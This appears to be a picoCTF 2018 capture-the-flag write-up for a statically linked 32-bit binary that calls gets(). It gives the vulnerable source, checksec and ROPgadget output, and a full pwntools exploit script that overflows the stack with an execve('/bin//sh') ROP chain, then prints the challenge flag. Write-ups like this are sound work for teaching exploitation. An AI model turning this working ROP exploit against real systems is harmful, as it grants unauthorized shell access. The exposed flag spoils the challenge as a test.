@@ -1,0 +1,259 @@
+# Problem
+Can you exploit the following [program](https://2018shell1.picoctf.com/static/925549a61a12c74b090c68bd2eee4477/gets) to get a flag? You may need to think return-oriented if you want to program your way to the flag. You can find the program in /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d on the shell server. [Source](https://2018shell1.picoctf.com/static/925549a61a12c74b090c68bd2eee4477/gets.c).
+
+## Hints:
+This is a classic gets ROP
+
+## Solution:
+
+Lets download the files:
+```bash
+wget https://2018shell1.picoctf.com/static/925549a61a12c74b090c68bd2eee4477/gets
+wget https://2018shell1.picoctf.com/static/925549a61a12c74b090c68bd2eee4477/gets.c
+chmod +x ./gets
+./gets
+
+GIVE ME YOUR NAME!
+<INPUT>
+```
+
+Lets take a look at the source:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 16
+
+void vuln() {
+  char buf[16];
+  printf("GIVE ME YOUR NAME!\n");
+  return gets(buf);
+
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+  
+}
+```
+
+In a first glimpse, we can think that overriding the return address and sending a shellcode will be enough.
+
+A deeper observation tells us that the stack isn't executable [Data Execution Prevention](https://en.wikipedia.org/wiki/Executable_space_protection#Windows), [NX bit](https://en.wikipedia.org/wiki/NX_bit).
+
+```bash
+checksec ./gets
+
+[*] 'CTFs-Writeups/picoCTF-2018/Binary/15-can_you_gets_me-650/gets'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled            :(
+    PIE:      No PIE (0x8048000)
+```
+
+In addition, libc isn't linked here, so we can't use it (unlike [got-2-lean-libc](https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/Binary/06-got_2_learn_libc-250/solution.md)).
+```bash
+ldd ./gets
+
+  not a dynamic executable
+
+
+strings ./gets | grep bin
+
+unexpected reloc type in static binary
+invalid fastbin entry (free)
+malloc(): smallbin double linked list corrupted
+binding file %s [%lu] to %s [%lu]: %s symbol `%s'
+_nl_domain_bindings
+_dl_bind_not
+```
+
+No "/bin/sh".
+
+As the hint says, we need to use ROP (a more advanced one then in [rop chain](https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/Binary/10-rop_chain-350/solution.md)).
+
+### Method 1 - Using automatic tools
+We will use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).
+
+```bash
+./ROPgadget/ROPgadget.py --binary ./gets --10-rop_chain-350
+
+Gadgets information
+============================================================
+0x080aa3f8 : aaa ; add esp, 4 ; pop ebx ; pop esi ; ret
+0x0806cd68 : aaa ; lea esp, dword ptr [ebp - 0xc] ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080b8329 : aaa ; push 1 ; push 1 ; call eax
+0x080b8792 : aaa ; push dword ptr [esp + 0xc] ; mov eax, dword ptr [esp + 0x14] ; call eax
+0x080b7d51 : aaa ; push ecx ; push 1 ; call eax
+0x080b2957 : aad 0x81 ; loop 0x80b2962 ; dec dword ptr [edi] ; add byte ptr [ecx], cl ; ret 0xb474
+0x080db5a9 : aad 0xf8 ; call dword ptr [ebx]
+0x080d2b26 : aad 8 ; stosd dword ptr es:[edi], eax ; ret
+0x080991b3 : aam 0 ; add byte ptr [eax], al ; mov eax, ebx ; pop ebx ; pop esi ; ret 8
+0x0804a0c2 : aam 0x29 ; ret 0xea83
+0x0808f18b : aam 0x5b ; ret
+0x08082350 : aam 0x83 ; rol byte ptr [ecx], 0x29 ; fidivr dword ptr [ecx] ; ret 0xee7f
+0x08070f93 : aam 0x89 ; retf
+0x0809d4bd : aam 0x8b ; pop ebp ; or al, 1 ; ret
+0x0808254f : aam 0x8b ; push edi ; add al, 1 ; retf 0xc085
+0x0809a542 : aam 0x8d ; hlt ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080e473c : aam 0x9a ; sti ; call dword ptr [edx]
+0x080e16d0 : aam 0xba ; add byte ptr [eax], al ; lodsb al, byte ptr [esi] ; jecxz 0x80e16d8 ; call dword ptr [esi]
+0x080a1900 : aam 0xba ; retf 0xd48
+...
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+  [+] Gadget found: 0x8051035 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret
+  [+] Gadget found: 0x8048433 pop esi ; ret
+  [+] Gadget found: 0x8048480 pop edi ; ret
+  [-] Can't find the 'xor edi, edi' gadget. Try with another 'mov [r], r'
+
+  [+] Gadget found: 0x80549db mov dword ptr [edx], eax ; ret
+  [+] Gadget found: 0x806f02a pop edx ; ret
+  [+] Gadget found: 0x80b81c6 pop eax ; ret
+  [+] Gadget found: 0x8049303 xor eax, eax ; ret
+
+- Step 2 -- Init syscall number gadgets
+
+  [+] Gadget found: 0x8049303 xor eax, eax ; ret
+  [+] Gadget found: 0x807a86f inc eax ; ret
+
+- Step 3 -- Init syscall arguments gadgets
+
+  [+] Gadget found: 0x80481c9 pop ebx ; ret
+  [+] Gadget found: 0x80de955 pop ecx ; ret
+  [+] Gadget found: 0x806f02a pop edx ; ret
+
+- Step 4 -- Syscall gadget
+
+  [+] Gadget found: 0x806cc25 int 0x80
+
+- Step 5 -- Build the ROP chain
+
+  #!/usr/bin/env python2
+  # execve generated by ROPgadget
+
+  from struct import pack
+
+  # Padding goes here
+  p = ''
+
+  p += pack('<I', 0x0806f02a) # pop edx ; ret
+  p += pack('<I', 0x080ea060) # @ .data
+  p += pack('<I', 0x080b81c6) # pop eax ; ret
+  p += '/bin'
+  p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+  p += pack('<I', 0x0806f02a) # pop edx ; ret
+  p += pack('<I', 0x080ea064) # @ .data + 4
+  p += pack('<I', 0x080b81c6) # pop eax ; ret
+  p += '//sh'
+  p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+  p += pack('<I', 0x0806f02a) # pop edx ; ret
+  p += pack('<I', 0x080ea068) # @ .data + 8
+  p += pack('<I', 0x08049303) # xor eax, eax ; ret
+  p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+  p += pack('<I', 0x080481c9) # pop ebx ; ret
+  p += pack('<I', 0x080ea060) # @ .data
+  p += pack('<I', 0x080de955) # pop ecx ; ret
+  p += pack('<I', 0x080ea068) # @ .data + 8
+  p += pack('<I', 0x0806f02a) # pop edx ; ret
+  p += pack('<I', 0x080ea068) # @ .data + 8
+  p += pack('<I', 0x08049303) # xor eax, eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0807a86f) # inc eax ; ret
+  p += pack('<I', 0x0806cc25) # int 0x80
+```
+
+Now we can simply use this in our exploit script:
+```python
+#!/usr/bin/env python
+
+from pwn import *
+from struct import pack
+
+
+debug = 0
+
+user = ''
+pw = ''
+
+payload = ''
+
+payload += pack('<I', 0x0806f02a) # pop edx ; ret
+payload += pack('<I', 0x080ea060) # @ .data
+payload += pack('<I', 0x080b81c6) # pop eax ; ret
+payload += '/bin'
+payload += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+payload += pack('<I', 0x0806f02a) # pop edx ; ret
+payload += pack('<I', 0x080ea064) # @ .data + 4
+payload += pack('<I', 0x080b81c6) # pop eax ; ret
+payload += '//sh'
+payload += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+payload += pack('<I', 0x0806f02a) # pop edx ; ret
+payload += pack('<I', 0x080ea068) # @ .data + 8
+payload += pack('<I', 0x08049303) # xor eax, eax ; ret
+payload += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
+payload += pack('<I', 0x080481c9) # pop ebx ; ret
+payload += pack('<I', 0x080ea060) # @ .data
+payload += pack('<I', 0x080de955) # pop ecx ; ret
+payload += pack('<I', 0x080ea068) # @ .data + 8
+payload += pack('<I', 0x0806f02a) # pop edx ; ret
+payload += pack('<I', 0x080ea068) # @ .data + 8
+payload += pack('<I', 0x08049303) # xor eax, eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0807a86f) # inc eax ; ret
+payload += pack('<I', 0x0806cc25) # int 0x80
+
+if debug:
+  p = process('./gets')
+else:
+  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
+  s.set_working_directory('/problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d')
+  
+  p = s.process('./gets')
+
+print p.recvuntil('GIVE ME YOUR NAME!')
+
+p.sendline('A' * 28 + payload)
+p.sendline('cat flag.txt')
+p.sendline('exit')
+
+print p.recvall()
+```
+
+### Method 2 - "Build our own ROP chain (Reinventing the wheel)"
+**TODO**
+
+Flag: picoCTF{rOp_yOuR_wAY_tO_AnTHinG_700e9c8e}
